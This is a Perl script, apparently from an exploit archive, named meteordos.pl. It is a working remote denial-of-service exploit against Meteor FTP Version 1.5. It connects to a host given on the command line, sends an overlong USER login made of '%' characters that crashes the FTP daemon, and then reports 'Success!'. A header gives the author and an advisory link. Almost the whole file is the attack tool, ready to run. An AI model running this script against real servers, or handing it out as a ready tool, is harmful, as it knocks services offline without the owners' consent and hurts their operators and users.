#!/usr/bin/perl
#
# meteordos.pl - Remote denial of service against Meteor FTP Version 1.5
#
# A vulnerability has been identified in Meteor FTP Version 1.5, which
# allows malicious users to remotely crash the ftpd. By connecting to the 
# ftpd and issuing USER followed by large amounts of data, the server 
# crashes. For more info, go to : 
# http://www.evicted.org/projects/writings/mftpadvisory.txt
# 
# Usage : ./meteordos.pl <host/ip>
#
# Vulnerability & code by zerash
# Contact : zerash@evicted.org

use Net::FTP;
$host = $ARGV[0];

if("$ARGV[0]" eq "") {
	print("DoS against Meteor FTP Version 1.5 by zerash\@evicted.org\n");
	die("Usage : ./meteorftpdos <host\/ip>\n");
} else {	
	
	print("Connecting to $host...\n");
	my $ftp = Net::FTP->new($host) or die "Couldn't connect to $host\n";
	print("Connected!\n");
	print("Attempting to exploit the ftpd...");
	$ftp->login('%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%');
	$ftp->quit;
	print("Success!\n");
}

